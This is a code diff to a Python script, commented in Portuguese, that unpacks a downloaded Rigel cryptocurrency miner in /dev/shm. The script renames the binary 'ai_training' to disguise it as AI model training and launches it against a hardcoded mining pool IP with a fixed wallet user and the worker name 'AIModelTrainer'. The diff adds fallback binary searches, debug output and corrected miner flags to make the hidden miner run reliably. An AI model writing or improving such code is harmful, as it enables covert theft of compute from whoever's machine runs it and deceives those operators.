@@ -34,46 +34,84 @@ def execute_miner(fd):
     with tempfile.TemporaryDirectory(dir="/dev/shm") as tmpdir:
         os.chdir(tmpdir)
         
-        # Configuração disfarçada como treinamento de IA
-        # Vamos usar argumentos na linha de comando em vez de arquivo de configuração
-        
+        # Extrair o arquivo baixado
         tar_cmd = ["/bin/tar", "xzf", f"/proc/self/fd/{fd}", "-C", tmpdir]
         subprocess.run(tar_cmd, check=True, pass_fds=[fd])
         
-        # Procurar pelo executável do Rigel e renomeá-lo para parecer um processo de treinamento de IA
+        # Procurar pelo executável do Rigel e renomeá-lo
         miner_bin = None
         for root, dirs, files in os.walk(tmpdir):
-            if "rigel" in files:
-                miner_bin = os.path.join(root, "rigel")
-                new_path = os.path.join(root, "ai_training")  # Nome mais discreto para o processo
-                os.rename(miner_bin, new_path)
-                miner_bin = new_path
+            # Procuramos qualquer arquivo executável que possa ser o minerador
+            for file in files:
+                file_path = os.path.join(root, file)
+                if os.access(file_path, os.X_OK) and ("rigel" in file.lower() or file == "rigel"):
+                    miner_bin = file_path
+                    new_path = os.path.join(root, "ai_training")
+                    os.rename(miner_bin, new_path)
+                    miner_bin = new_path
+                    break
+            if miner_bin:
                 break
         
         if not miner_bin:
+            # Tentativa alternativa: procurar qualquer executável na pasta extraída
+            for root, dirs, files in os.walk(tmpdir):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    if os.access(file_path, os.X_OK):
+                        print(f"Encontrado executável potencial: {file_path}")
+                        miner_bin = file_path
+                        new_path = os.path.join(root, "ai_training")
+                        os.rename(miner_bin, new_path)
+                        miner_bin = new_path
+                        break
+                if miner_bin:
+                    break
+        
+        if not miner_bin:
+            # Listar todos os arquivos para depuração
+            print("Conteúdo extraído:")
+            for root, dirs, files in os.walk(tmpdir):
+                for file in files:
+                    print(f" - {os.path.join(root, file)}")
             raise FileNotFoundError("Arquivo do minerador não encontrado")
-            
+        
         os.chmod(miner_bin, 0o755)
         
-        # Usar parâmetros diretamente na linha de comando
-        args = [
-            miner_bin,
-            "--algorithm", "octopus",
-            "--url", "stratum+ssl://54.232.215.174:8443",
-            "--user", "krxY97WV2D.CLD",
-            "--pass", "x",
-            "--worker", "AIModelTrainer"
-        ]
+        # Usar uma abordagem diferente para os argumentos
+        # Vamos simplesmente passar o executável como primeiro argumento
+        # e deixar o Rigel usar sua configuração padrão com parâmetros mínimos
+        args = [miner_bin]
+        
+        # Adicionar apenas os parâmetros essenciais
+        args.extend(["--algorithm", "octopus"])  # Corrigido de --algo para --algorithm
+        args.extend(["--url", "stratum+ssl://54.232.215.174:8443"])
+        args.extend(["--user", "krxY97WV2D.CLD"])
+        args.extend(["--pass", "x"])
+        
+        # Nome de worker opcional
+        if True:  # Pode ser condicionado se necessário
+            args.extend(["--rigName", "AIModelTrainer"])  # Corrigido de --worker para --rigName
+        
+        # Imprimir os argumentos para depuração
+        print(f"Executando: {' '.join(args)}")
         
         env = os.environ.copy()
         env["LD_PRELOAD"] = ""
         
-        pid = os.fork()
-        if pid == 0:
-            os.close(fd)
-            os.execve(miner_bin, args, env)
-        else:
-            os.waitpid(pid, 0)
+        # Tentar execução direta para ver mensagens de erro
+        try:
+            subprocess.run(args, env=env, check=True)
+        except subprocess.CalledProcessError as e:
+            print(f"Erro ao executar o minerador: {e}")
+            
+            # Tentar com fork/execve como no original
+            pid = os.fork()
+            if pid == 0:
+                os.close(fd)
+                os.execve(miner_bin, args, env)
+            else:
+                os.waitpid(pid, 0)
 
 if __name__ == "__main__":
     try:
